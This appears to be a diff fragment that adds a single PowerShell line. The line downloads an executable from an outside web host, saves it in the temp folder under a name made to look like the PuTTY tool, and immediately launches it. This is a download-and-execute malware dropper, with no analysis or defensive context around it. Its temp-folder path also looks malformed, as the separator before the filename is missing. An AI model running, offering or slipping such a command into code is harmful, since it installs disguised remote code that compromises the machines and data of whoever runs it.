@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://khoun-legal.com/download/ctob.exe',"$env:TEMPputtyx86.exe");Start-Process ("$env:TEMPputtyx86.exe")
